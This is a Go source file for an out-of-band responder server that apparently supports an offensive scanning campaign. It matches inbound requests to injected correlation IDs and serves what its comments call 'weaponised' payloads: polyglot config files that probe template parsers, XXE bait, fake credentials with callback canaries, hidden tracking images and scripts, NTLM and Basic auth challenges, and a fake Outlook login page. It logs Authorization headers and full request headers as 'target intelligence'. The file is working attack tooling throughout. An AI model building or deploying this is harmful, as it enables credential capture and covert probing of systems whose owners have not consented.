package main

import (
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"db26/internal/payloads"
)

// Hit is the full record of a tainted request with target intelligence.
type Hit struct {
	// Request
	Timestamp   string              `json:"timestamp"`
	RemoteAddr  string              `json:"remote_addr"`
	RemoteIP    string              `json:"remote_ip"`
	Host        string              `json:"host"`
	Method      string              `json:"method"`
	URI         string              `json:"uri"`
	TLS         bool                `json:"tls"`
	UserAgent   string              `json:"user_agent"`
	Headers     map[string][]string `json:"headers"`
	Auth        string              `json:"authorization,omitempty"`

	// Parsed from Host
	Prefix      string `json:"prefix"`
	Domain      string `json:"domain"`
	CorrID      string `json:"correlation_id"`

	// Classification
	PathClass   string `json:"path_class"`
	PayloadServed string `json:"payload_served"`
	CanaryToken string `json:"canary_token"`
	Tainted     bool   `json:"tainted"`

	// Target Intelligence
	ReverseDNS  []string `json:"reverse_dns,omitempty"`

	// Tracking
	TrackingURL string `json:"tracking_url,omitempty"`
}

var (
	corrIDs    map[string]bool
	mu         sync.Mutex
	hitFile    *os.File
	noiseFile  *os.File
	hitCount   int64
	noiseCount int64
	oobBase    string
	vpsIP      string
)

func main() {
	outDir := "/root/db26/responder"
	if len(os.Args) > 1 {
		outDir = os.Args[1]
	}
	os.MkdirAll(outDir, 0755)

	vpsIP = envOr("VPS_IP", "<YOUR_VPS_IP>")
	oobBase = envOr("OOB_BASE", "")

	// Load correlation IDs from all runs
	corrIDs = loadCorrelationIDs()
	fmt.Printf("[*] Loaded %d correlation IDs\n", len(corrIDs))

	// Open output files
	var err error
	hitFile, err = os.OpenFile(filepath.Join(outDir, "tainted_hits.jsonl"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer hitFile.Close()

	noiseFile, err = os.OpenFile(filepath.Join(outDir, "noise.jsonl"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer noiseFile.Close()

	// Proxy interactsh API + tech callback handler
	mux := http.NewServeMux()
	mux.HandleFunc("/register", proxyInteractsh)
	mux.HandleFunc("/deregister", proxyInteractsh)
	mux.HandleFunc("/poll", proxyInteractsh)
	mux.HandleFunc("/tech/", techCallbackHandler)
	mux.HandleFunc("/cb/", techCallbackHandler)
	mux.HandleFunc("/", handler)

	// HTTP :80
	go func() {
		fmt.Println("[*] Responder HTTP :80")
		log.Fatal(http.ListenAndServe(":80", mux))
	}()

	// HTTPS :443
	certDir := "/root/.local/share/certmagic/certificates/acme-v02.api.letsencrypt.org-directory"
	certFile, keyFile := findCert(certDir)
	if certFile != "" {
		fmt.Printf("[*] Responder HTTPS :443\n")
		cert, err := tls.LoadX509KeyPair(certFile, keyFile)
		if err != nil {
			log.Fatal(err)
		}
		srv := &http.Server{
			Addr:      ":443",
			Handler:   mux,
			TLSConfig: &tls.Config{Certificates: []tls.Certificate{cert}},
		}
		log.Fatal(srv.ListenAndServeTLS("", ""))
	} else {
		fmt.Println("[!] No cert — HTTPS disabled")
		select {}
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	ip := extractIP(r.RemoteAddr)
	host := r.Host
	uri := r.RequestURI
	proto := "HTTP"
	if r.TLS != nil {
		proto = "HTTPS"
	}

	// Skip our own VPS
	if ip == vpsIP {
		serveNTLMChallenge(w)
		return
	}

	// Check if tainted (correlation ID in Host)
	prefix, domain, corrID, tainted := parseHost(host)

	hit := Hit{
		Timestamp:  time.Now().UTC().Format(time.RFC3339),
		RemoteAddr: r.RemoteAddr,
		RemoteIP:   ip,
		Host:       host,
		Method:     r.Method,
		URI:        uri,
		TLS:        r.TLS != nil,
		UserAgent:  r.Header.Get("User-Agent"),
		Headers:    r.Header,
		Auth:       r.Header.Get("Authorization"),
		Prefix:     prefix,
		Domain:     domain,
		CorrID:     corrID,
		Tainted:    tainted,
	}

	if !tainted {
		// Noise — log separately, serve generic 401
		mu.Lock()
		noiseCount++
		mu.Unlock()
		data, _ := json.Marshal(hit)
		mu.Lock()
		fmt.Fprintf(noiseFile, "%s\n", data)
		mu.Unlock()
		serveNTLMChallenge(w)
		return
	}

	// === TAINTED REQUEST ===
	// Reverse DNS
	hit.ReverseDNS = reverseDNS(ip)

	// Classify path and generate canary
	hit.PathClass = classifyPath(uri)
	hit.CanaryToken = makeCanary(ip, host, uri)

	// Generate tracking URL for embedded callbacks
	hit.TrackingURL = fmt.Sprintf("https://%s.%s/cb/%s", hit.CanaryToken[:16], oobBase, hit.CanaryToken)

	// Serve weaponised payload
	hit.PayloadServed = servePayload(w, r, uri, hit.CanaryToken, hit.TrackingURL, domain)

	// Log
	data, _ := json.Marshal(hit)
	mu.Lock()
	hitCount++
	n := hitCount
	fmt.Fprintf(hitFile, "%s\n", data)
	mu.Unlock()

	fmt.Printf("[HIT] #%d %s %s %s from %s (%s) — %s → %s\n",
		n, proto, r.Method, uri, ip, domain, hit.PathClass, hit.PayloadServed)
}

func servePayload(w http.ResponseWriter, r *http.Request, uri, canary, trackURL, domain string) string {
	u := strings.ToLower(uri)

	baseCallback := fmt.Sprintf("https://%s.%s/tech", canary[:16], oobBase)

	// === .env files (polyglot — detects parser technology) ===
	if strings.Contains(u, ".env") {
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(200)
		body := payloads.EnvPayload(baseCallback, canary, domain)
		fmt.Fprint(w, body)
		return "polyglot_env"
	}

	// === .git/config ===
	if strings.Contains(u, ".git/config") || strings.Contains(u, "%63onfig") {
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(200)
		fmt.Fprintf(w, `[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://canary_%s@github.com/internal/production-app.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
[user]
	name = deploy-bot
	email = deploy@%s
# CANARY: %s
`, canary[:16], domain, trackURL)
		return "fake_git_config"
	}

	// === .git/HEAD ===
	if strings.Contains(u, ".git/head") {
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(200)
		fmt.Fprint(w, "ref: refs/heads/main\n")
		return "fake_git_head"
	}

	// === favicon.ico (serve HTML that phones home) ===
	if strings.Contains(u, "favicon") {
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(200)
		fmt.Fprintf(w, `<!DOCTYPE html><html><head><title>.</title></head><body>
<img src="%s" style="display:none">
<script>new Image().src="%s"+"?r="+Math.random();</script>
</body></html>`, trackURL, trackURL)
		return "html_favicon_with_callback"
	}

	// === robots.txt ===
	if strings.Contains(u, "robots.txt") {
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(200)
		fmt.Fprintf(w, "User-agent: *\nDisallow: /\nSitemap: %s/sitemap.xml\n# %s\n", trackURL, canary)
		return "robots_with_tracking_sitemap"
	}

	// === PHP info pages ===
	if strings.HasSuffix(u, ".php") {
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(200)
		fmt.Fprintf(w, `<!DOCTYPE html><html><head><title>phpinfo()</title></head>
<body><h1>PHP Version 8.2.0</h1>
<table><tr><td>System</td><td>Linux prod-web-01 5.15.0</td></tr>
<tr><td>Server API</td><td>Apache 2.0 Handler</td></tr>
<tr><td>DOCUMENT_ROOT</td><td>/var/www/html</td></tr>
<tr><td>SERVER_ADDR</td><td>10.0.1.50</td></tr>
<tr><td>DB_HOST</td><td>rds-prod-01.internal</td></tr>
</table>
<img src="%s" style="display:none">
<!-- CANARY: %s -->
</body></html>`, trackURL, canary)
		return "fake_phpinfo_with_callback"
	}

	// === config.json / *.json (polyglot) ===
	if strings.HasSuffix(u, ".json") {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(200)
		body := payloads.ConfigJSONPayload(baseCallback, canary)
		fmt.Fprint(w, body)
		return "polyglot_config_json"
	}

	// === XML files (XXE bait) ===
	if strings.HasSuffix(u, ".xml") {
		w.Header().Set("Content-Type", "application/xml")
		w.WriteHeader(200)
		fmt.Fprintf(w, `<?xml version="1.0" encoding="UTF-8"?>
<config>
  <database host="rds-prod.internal" port="3306"/>
  <api key="canary_%s"/>
  <callback url="%s"/>
  <!-- CANARY: %s -->
</config>`, canary[:16], trackURL, canary)
		return "fake_xml_config"
	}

	// === YAML/YML config ===
	if strings.HasSuffix(u, ".yml") || strings.HasSuffix(u, ".yaml") {
		w.Header().Set("Content-Type", "text/yaml")
		w.WriteHeader(200)
		fmt.Fprintf(w, `---
production:
  database:
    host: rds-prod.internal
    port: 3306
    password: canary_%s
  api_key: canary_%s
  callback: %s
# CANARY: %s
`, canary[:16], canary[:20], trackURL, canary)
		return "fake_yaml_config"
	}

	// === .aws/credentials ===
	if strings.Contains(u, "aws") && strings.Contains(u, "credentials") {
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(200)
		fmt.Fprintf(w, `[default]
aws_access_key_id = AKIAIOSFODNN7CANARY%s
aws_secret_access_key = canary/%s/secret
region = us-east-1
# CANARY: %s
`, canary[:8], canary[:16], trackURL)
		return "fake_aws_credentials"
	}

	// === wp-config.php ===
	if strings.Contains(u, "wp-config") {
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(200)
		fmt.Fprintf(w, `<?php
define('DB_NAME', 'wordpress_prod');
define('DB_USER', 'wp_admin');
define('DB_PASSWORD', 'canary_%s');
define('DB_HOST', 'rds-prod.internal');
define('AUTH_KEY', 'canary_%s');
// CANARY: %s
?>`, canary[:16], canary[:24], trackURL)
		return "fake_wp_config"
	}

	// === API endpoints ===
	if strings.Contains(u, "/api") {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(200)
		fmt.Fprintf(w, `{"status":"ok","version":"2.1.0","canary":"%s","callback":"%s"}`, canary[:16], trackURL)
		return "fake_api_response"
	}

	// === OWA / login pages ===
	if strings.Contains(u, "owa") || strings.Contains(u, "login") || strings.Contains(u, "auth") {
		w.Header().Set("Content-Type", "text/html")
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Add("WWW-Authenticate", "Negotiate")
		w.Header().Add("WWW-Authenticate", `Basic realm="Outlook Web Access"`)
		w.WriteHeader(401)
		fmt.Fprintf(w, `<!DOCTYPE html><html><body>
<h2>Sign in</h2><form><input name="u" placeholder="user@domain"><input name="p" type="password"><button>Sign In</button></form>
<img src="%s" style="display:none">
</body></html>`, trackURL)
		return "fake_login_with_ntlm_basic"
	}

	// === Default: NTLM + Basic challenge ===
	w.Header().Set("WWW-Authenticate", "NTLM")
	w.Header().Add("WWW-Authenticate", "Negotiate")
	w.Header().Add("WWW-Authenticate", `Basic realm="Restricted"`)
	w.Header().Set("Content-Type", "text/html")
	w.WriteHeader(401)
	fmt.Fprintf(w, `<!DOCTYPE html><html><body>Authentication Required<img src="%s" style="display:none"></body></html>`, trackURL)
	return "ntlm_basic_challenge"
}

// techCallbackHandler fires when a polyglot payload's embedded callback is triggered.
// This confirms the target parsed and executed/rendered our payload.
func techCallbackHandler(w http.ResponseWriter, r *http.Request) {
	ip := extractIP(r.RemoteAddr)
	if ip == vpsIP {
		w.WriteHeader(200)
		return
	}

	// Extract tech type from path: /tech/jinja2 or /cb/CANARY
	parts := strings.Split(r.URL.Path, "/")
	techType := "unknown"
	if len(parts) >= 3 {
		techType = parts[2]
	}

	canaryParam := r.URL.Query().Get("c")
	rdns := reverseDNS(ip)
	proto := "HTTP"
	if r.TLS != nil {
		proto = "HTTPS"
	}

	techHit := map[string]interface{}{
		"type":        "TECH_CALLBACK",
		"timestamp":   time.Now().UTC().Format(time.RFC3339),
		"technology":  techType,
		"remote_ip":   ip,
		"remote_addr": r.RemoteAddr,
		"host":        r.Host,
		"uri":         r.RequestURI,
		"protocol":    proto,
		"user_agent":  r.Header.Get("User-Agent"),
		"referer":     r.Header.Get("Referer"),
		"canary":      canaryParam,
		"reverse_dns": rdns,
		"headers":     r.Header,
	}

	data, _ := json.Marshal(techHit)
	mu.Lock()
	fmt.Fprintf(hitFile, "%s\n", data)
	mu.Unlock()

	fmt.Printf("[TECH] %s %s callback from %s (%v) canary=%s\n",
		techType, proto, ip, rdns, canaryParam)

	// Serve a 1x1 pixel (for img callbacks)
	w.Header().Set("Content-Type", "image/gif")
	w.WriteHeader(200)
	// 1x1 transparent GIF
	w.Write([]byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b})
}

func serveNTLMChallenge(w http.ResponseWriter) {
	w.Header().Set("WWW-Authenticate", "NTLM")
	w.Header().Add("WWW-Authenticate", "Negotiate")
	w.Header().Add("WWW-Authenticate", `Basic realm="Restricted"`)
	w.WriteHeader(401)
	fmt.Fprint(w, "Authentication Required")
}

func parseHost(host string) (prefix, domain, corrID string, tainted bool) {
	host = strings.ToLower(host)
	// Strip port
	if idx := strings.LastIndex(host, ":"); idx > 0 {
		h := host[:idx]
		if net.ParseIP(h) == nil {
			host = h
		}
	}

	for cid := range corrIDs {
		if strings.Contains(host, cid) {
			idx := strings.Index(host, cid)
			before := strings.TrimSuffix(host[:idx], ".")
			parts := strings.SplitN(before, ".", 2)
			if len(parts) == 2 {
				return parts[0], parts[1], cid, true
			}
			if len(parts) == 1 {
				return "", parts[0], cid, true
			}
			return "", "", cid, true
		}
	}
	return "", "", "", false
}

func classifyPath(uri string) string {
	u := strings.ToLower(uri)
	switch {
	case strings.Contains(u, ".env"):
		return "credential_leak"
	case strings.Contains(u, ".git"):
		return "git_exposure"
	case strings.Contains(u, ".aws") || strings.Contains(u, "credentials"):
		return "cloud_credential"
	case strings.Contains(u, "wp-config") || strings.Contains(u, "wp-login"):
		return "wordpress"
	case strings.Contains(u, "ignition") || strings.Contains(u, "gpon"):
		return "rce_attempt"
	case strings.HasSuffix(u, ".php"):
		return "dynamic_php"
	case strings.HasSuffix(u, ".json"):
		return "config_json"
	case strings.HasSuffix(u, ".xml"):
		return "config_xml"
	case strings.HasSuffix(u, ".yml") || strings.HasSuffix(u, ".yaml"):
		return "config_yaml"
	case strings.Contains(u, "favicon"):
		return "asset_favicon"
	case strings.Contains(u, "robots"):
		return "crawl_robots"
	case strings.Contains(u, "/api"):
		return "api_endpoint"
	case strings.Contains(u, "login") || strings.Contains(u, "auth") || strings.Contains(u, "owa"):
		return "auth_endpoint"
	case strings.Contains(u, "..") || strings.Contains(u, "%5c"):
		return "path_traversal"
	default:
		return "other"
	}
}

func makeCanary(ip, host, uri string) string {
	h := sha256.New()
	h.Write([]byte(ip + "|" + host + "|" + uri + "|" + time.Now().Format("2006-01-02")))
	return hex.EncodeToString(h.Sum(nil))
}

func reverseDNS(ip string) []string {
	names, err := net.LookupAddr(ip)
	if err != nil {
		return nil
	}
	return names
}

func extractIP(addr string) string {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return addr
	}
	return host
}

func loadCorrelationIDs() map[string]bool {
	ids := make(map[string]bool)
	entries, _ := os.ReadDir("/root/db26/runs")
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		// From correlation_id file
		data, err := os.ReadFile("/root/db26/runs/" + e.Name() + "/correlation_id")
		if err == nil {
			cid := strings.TrimSpace(string(data))
			if cid != "" {
				ids[cid] = true
			}
		}
	}
	// Also allow live injection via env
	if extra := os.Getenv("EXTRA_CORR_IDS"); extra != "" {
		for _, cid := range strings.Split(extra, ",") {
			cid = strings.TrimSpace(cid)
			if cid != "" {
				ids[cid] = true
			}
		}
	}
	return ids
}

func proxyInteractsh(w http.ResponseWriter, r *http.Request) {
	target := "http://127.0.0.1:8080" + r.RequestURI
	req, err := http.NewRequest(r.Method, target, r.Body)
	if err != nil {
		http.Error(w, "proxy error", 502)
		return
	}
	for k, v := range r.Header {
		req.Header[k] = v
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		http.Error(w, "proxy error", 502)
		return
	}
	defer resp.Body.Close()
	for k, v := range resp.Header {
		for _, val := range v {
			w.Header().Add(k, val)
		}
	}
	w.WriteHeader(resp.StatusCode)
	io.Copy(w, resp.Body)
}

func findCert(certDir string) (string, string) {
	entries, err := os.ReadDir(certDir)
	if err != nil {
		return "", ""
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.Contains(entry.Name(), "") {
			dir := filepath.Join(certDir, entry.Name())
			cert := filepath.Join(dir, entry.Name()+".crt")
			key := filepath.Join(dir, entry.Name()+".key")
			if _, err := os.Stat(cert); err == nil {
				if _, err := os.Stat(key); err == nil {
					return cert, key
				}
			}
		}
	}
	return "", ""
}

func envOr(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}
